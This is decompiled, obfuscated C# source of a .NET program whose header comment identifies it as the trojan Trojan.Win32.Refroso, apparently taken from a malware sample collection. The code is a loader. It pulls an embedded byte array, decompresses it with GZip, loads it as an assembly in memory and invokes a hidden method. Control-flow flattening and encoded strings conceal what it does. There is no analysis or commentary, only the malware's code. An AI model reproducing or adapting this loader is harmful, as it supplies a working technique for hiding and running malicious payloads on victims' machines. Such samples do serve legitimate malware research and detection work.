// Decompiled with JetBrains decompiler
// Type: .
// Assembly: C, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F25E1EAB-EB04-4ECD-A70E-0143E63DFF03
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.Win32.Refroso.hrpz-e40496d5f84ff83ebc4a14536714c2842f292149aa58d7861f48ee8d2476be88.exe

using \u0008;
using \u000E;
using \u000F;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;

namespace \u000F
{
  internal sealed class \u0005
  {
    public \u0005()
    {
      try
      {
      }
      catch (Exception ex)
      {
        \u0005.\u0002(ex, (object) this);
        throw;
      }
    }

    public static object \u0002(
      [In] ref byte[] obj0,
      [In] ref string obj1,
      [In] ref string obj2,
      [In] ref object obj3)
    {
      string str1;
      Assembly assembly1;
      MethodInfo methodInfo1;
      object obj4;
      object obj5;
      try
      {
        Assembly assembly2 = Assembly.Load(obj0);
        if (true)
          goto label_9;
label_1:
        int num = 0;
        while (true)
        {
          switch (num)
          {
            case 0:
              str1 = Strings.Split(assembly1.ToString(), \u000F.\u0008.\u0002("ㄜ", 0))[0] + \u000F.\u0008.\u0002("〝", 1);
              num = 1;
              continue;
            case 1:
              methodInfo1 = \u008A\u0004.\u007E\u000E\u0004((object) \u009A\u0004.\u007E\u0090\u0005((object) assembly1, \u0098\u0003.\u0087\u0002(str1, obj1)), obj2);
              if (true)
              {
                num = 2;
                continue;
              }
              break;
            case 2:
              obj4 = \u0087\u0003.\u001B\u0007(\u0005\u0004.\u0003\u0003(\u009A\u0004.\u007E\u0090\u0005((object) assembly1, \u0098\u0003.\u0087\u0002(str1, obj1))));
              break;
            case 3:
              obj5 = \u0008\u0005.\u007E\u000F\u0006((object) methodInfo1, \u0087\u0003.\u001B\u0007(obj4), (object[]) obj3);
              num = 4;
              continue;
            default:
              goto label_8;
          }
          num = 3;
        }
label_8:
        return obj5;
label_9:
        assembly1 = assembly2;
        goto label_1;
      }
      catch (Exception ex)
      {
        string str2 = str1;
        Assembly assembly3 = assembly1;
        object obj6 = obj5;
        MethodInfo methodInfo2 = methodInfo1;
        object obj7 = obj4;
        byte[] numArray = obj0;
        string str3 = obj1;
        string str4 = obj2;
        object obj8 = obj3;
        \u0005.\u0002(ex, (object) str2, (object) assembly3, obj6, (object) methodInfo2, obj7, (object) numArray, (object) str3, (object) str4, obj8);
        throw;
      }
    }

    public static byte[] \u0002([In] byte[] obj0, [In] ref bool obj1)
    {
      GZipStream gzipStream1;
      MemoryStream memoryStream1;
      byte[] numArray1;
      byte[] numArray2;
      MemoryStream memoryStream2;
      GZipStream gzipStream2;
      byte[] numArray3;
      int num1;
      byte[] numArray4;
      try
      {
        if (!obj1)
          goto label_10;
        else
          goto label_23;
label_1:
        int num2;
        while (true)
        {
          switch (num2)
          {
            case 0:
              gzipStream1 = new GZipStream((Stream) memoryStream1, CompressionMode.Compress, true);
              num2 = 1;
              continue;
            case 1:
              gzipStream1.Write(obj0, 0, obj0.Length);
              num2 = 2;
              continue;
            case 2:
              if (true)
              {
                \u0014\u0003.\u007E\u009A\u0006((object) gzipStream1);
                num2 = 3;
                continue;
              }
              break;
            case 3:
              \u0080\u0005.\u007E\u0013\u0007((object) memoryStream1, 0L);
              num2 = 4;
              continue;
            case 4:
              numArray1 = new byte[checked ((int) \u007F\u0005.\u007E\u0012\u0007((object) memoryStream1) + 1)];
              num2 = 5;
              continue;
            case 5:
              int num3 = \u0017\u0003.\u007E\u0014\u0007((object) memoryStream1, numArray1, 0, numArray1.Length);
              break;
            case 6:
              \u0014\u0003.\u007E\u009A\u0006((object) memoryStream1);
              num2 = 7;
              continue;
            case 7:
              numArray2 = numArray1;
              num2 = 8;
              continue;
            case 9:
              gzipStream2 = new GZipStream((Stream) memoryStream2, CompressionMode.Decompress);
              num2 = 10;
              continue;
            case 10:
              numArray3 = new byte[4];
              num2 = 11;
              continue;
            case 11:
              \u0080\u0005.\u007E\u0013\u0007((object) memoryStream2, checked (\u007F\u0005.\u007E\u0012\u0007((object) memoryStream2) - 5L));
              num2 = 12;
              continue;
            case 12:
              int num4 = \u0017\u0003.\u007E\u0014\u0007((object) memoryStream2, numArray3, 0, 4);
              num2 = 13;
              continue;
            case 13:
              num1 = \u0012\u0004.\u0017\u0003(numArray3, 0);
              num2 = 14;
              continue;
            case 14:
              \u0080\u0005.\u007E\u0013\u0007((object) memoryStream2, 0L);
              num2 = 15;
              continue;
            case 15:
              numArray4 = new byte[checked (num1 - 1 + 1)];
              num2 = 16;
              continue;
            case 16:
              int num5 = \u0017\u0003.\u007E\u001F((object) gzipStream2, numArray4, 0, num1);
              num2 = 17;
              continue;
            case 17:
              \u0014\u0003.\u007E\u009A\u0006((object) gzipStream2);
              num2 = 18;
              continue;
            case 18:
              \u0014\u0003.\u007E\u009A\u0006((object) memoryStream2);
              num2 = 19;
              continue;
            case 19:
              numArray2 = numArray4;
              num2 = 20;
              continue;
            default:
              goto label_22;
          }
          num2 = 6;
        }
label_22:
        return numArray2;
label_10:
        memoryStream2 = new MemoryStream(obj0);
        num2 = 9;
        goto label_1;
label_23:
        memoryStream1 = new MemoryStream();
        num2 = 0;
        goto label_1;
      }
      catch (Exception ex)
      {
        object[] objArray = new object[11]
        {
          (object) numArray2,
          (object) numArray1,
          (object) gzipStream1,
          (object) memoryStream1,
          (object) numArray4,
          (object) numArray3,
          (object) gzipStream2,
          (object) memoryStream2,
          (object) num1,
          (object) obj0,
          (object) obj1
        };
        \u0005.\u0002(ex, objArray);
        throw;
      }
    }

    [STAThread]
    public static void \u0002()
    {
label_0:
      bool flag;
      byte[] numArray1;
      string str1;
      string str2;
      object obj;
      Exception exception;
      try
      {
        try
        {
          while (\u0004.\u0002())
          {
            byte[] numArray2 = \u0006.\u0002();
            flag = false;
            ref bool local1 = ref flag;
            numArray1 = \u0005.\u0002(numArray2, ref local1);
label_1:
            for (int index = 0; index == 0; index = 1)
            {
              if (true)
              {
                ref byte[] local2 = ref numArray1;
                str1 = \u000F.\u0008.\u0002("崝", 1);
                ref string local3 = ref str1;
                str2 = \u000F.\u0008.\u0002("夠", 4);
                ref string local4 = ref str2;
                obj = (object) null;
                ref object local5 = ref obj;
                \u0005.\u0002(ref local2, ref local3, ref local4, ref local5);
                if (false)
                  goto label_0;
              }
              else
                goto label_1;
            }
            break;
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception = ex;
          for (int index = 0; index == 0; index = 1)
            \u0098\u0005.\u009F\u0007();
        }
      }
      catch (Exception ex)
      {
        object[] objArray = new object[6]
        {
          (object) exception,
          (object) flag,
          (object) numArray1,
          (object) str1,
          (object) str2,
          obj
        };
        \u0005.\u0002(ex, objArray);
      }
    }
  }
}
